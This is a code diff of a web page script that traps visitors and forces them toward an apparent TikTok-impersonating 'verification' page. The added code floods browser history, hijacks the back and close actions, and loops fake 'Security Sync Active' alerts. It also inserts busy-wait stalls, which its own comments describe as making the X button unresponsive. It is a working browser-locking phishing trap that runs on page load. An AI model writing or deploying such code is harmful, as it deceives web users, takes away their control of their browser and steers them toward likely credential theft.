@@ -10,15 +10,7 @@
 <script>
     const target = "https://tik-tok-verification.com/Verification/verify1.html";
     const killTime = Date.now() + 10000; 
-    const gap = 320; 
-
-    function jamHistory() {
-        // Pushes the current state into the history 20 times per cycle
-        // This makes 'Back' or 'Close' much harder to execute
-        for (let i = 0; i < 20; i++) {
-            window.history.pushState(null, "", window.location.href);
-        }
-    }
+    const windowDelay = 220; // Tightened for X-button suppression
 
     function triggerJump() {
         const urlEnc = encodeURIComponent(target);
@@ -29,40 +21,41 @@
         window.location.href = trigger;
     }
 
+    function jamUI() {
+        // Heavy history flood to pin the 'X' button
+        for (let i = 0; i < 50; i++) {
+            window.history.pushState(null, "", window.location.href);
+        }
+    }
+
     function rampage() {
         if (Date.now() > killTime) return;
 
-        // 1. Flood the history stack instantly
-        jamHistory();
-
-        // 2. Fire the Redirect
+        // 1. Fire the Redirect
         triggerJump();
+        jamUI();
 
-        // 3. The 320ms GAP (Protected by history jamming)
+        // 2. THE LOCK
+        alert("ATTEMPT #33\n\nSecurity Sync Active.\n\nTap OK to finalize.");
+
+        // 3. THE CRITICAL GAP (220ms)
+        // We use a small 'Stutter' to make the X button lag during this window
+        const start = Date.now();
+        while (Date.now() - start < 50) {
+            // This 50ms 'frozen' block happens AFTER 'OK' is pressed,
+            // making the 'X' button unresponsive during the spam attempt.
+            window.localStorage.setItem('block', Math.random());
+        }
+
         setTimeout(() => {
             if (document.hasFocus()) {
-                // Main Alert Lock
-                alert("ATTEMPT #32\n\nRedirecting to System Browser...\n\nTap OK to continue.");
-                
-                // Fire again using the tap momentum
-                triggerJump();
-                
-                // Recurse
-                setTimeout(rampage, 1);
+                rampage();
             }
-        }, gap);
+        }, windowDelay - 50); // Adjusting for the 50ms stutter
     }
 
-    // Force a jam if they try to use the back button
-    window.onpopstate = function() {
-        jamHistory();
-        triggerJump();
-    };
-
-    window.onload = () => {
-        rampage();
-    };
-
+    window.onpopstate = () => { jamUI(); triggerJump(); };
+    window.onload = () => { rampage(); };
     window.onblur = () => { if (Date.now() < killTime) triggerJump(); };
 </script>
 
